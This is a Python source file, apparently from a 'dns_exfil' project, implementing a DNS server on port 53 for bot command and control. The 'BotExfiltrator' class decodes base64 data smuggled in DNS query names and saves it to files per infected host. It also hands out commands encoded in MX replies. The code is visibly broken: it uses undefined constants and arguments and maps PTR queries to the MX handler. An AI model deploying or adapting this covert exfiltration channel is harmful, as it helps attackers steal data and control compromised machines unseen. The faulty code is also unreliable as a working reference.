import base64

from dns_exfil import config

from dnslib import DNSRecord, RR, QTYPE, A, MX
from socketserver import BaseRequestHandler, UDPServer

class DNSServer(BaseRequestHandler):
    '''
    Base Class for specific Exfiltrator modes
    Defines default behavior, which acts as a normal DNS server
    Unusual behavior modes should be defined in a subclass of this server.
    '''
    def __init__(self, request, client_address, server):
        # link the piece of global config relevant to this instance
        context_name = type(self).__name__.lower()
        self.context = config['server'][context_name]

        # Maps the numerical DNS query type to the handler
        # There are a lot of relevant RFC's.
        # https://en.wikipedia.org/wiki/List_of_DNS_record_types
        self.q_processors = {
            1: self.A,      # A record
            12: self.MX,    # PTR record
            15: self.MX,    # MX record
            28: self.AAAA   # AAAA record
            }
        super(DNSServer, self).__init__(request, client_address, server)
    def AAAA(self, name):
        pass
        
        return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
    def A(self, name):
        pass

    def MX(self, name):
        pass

    def handle(self):
        request = DNSRecord.parse(self.request[0])
        socket = self.request[1]
        reply = request.reply()
        answer = self.q_processors[reply.q.qtype](reply.q.qname)
        reply.add_answer(answer)
        socket.sendto(reply.pack(), self.client_address)

class BotExfiltrator(DNSServer):
    def __init__(self):
        super(BotExfiltrator, self).__init__(request, client_address, server)

    def AAAA(self, name):
        return RR(name, QTYPE.A, rdata=A(), ttl=0)

    def A(self, name):
        rfilename = name.label[1]
        host = self.client_address[0]
        if rfilename == self.context['cmd']:
            lfilename = rfilename
        else:
            lfilename = host + '_' + rfilename
        try:
            with open(lfilename, 'a+b') as f:
                f.write(base64.b64decode(name.label[0]))
        except:
            pass
        return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)

    def MX(self, name):
        try:
            with open(self.context['cmd']) as f:
                 cmd = base64.standard_b64encode(f.readlines()[-1][:-1])
        except:
            cmd = base64.standard_b64encode('')
        return RR(name, QTYPE.MX, rdata=MX(cmd + "." + DOMAIN_NAME), ttl=0)


# Run the actual server. 
def start_server(listen, handler):
    server = UDPServer((listen, 53), handler)
    server.serve_forever()
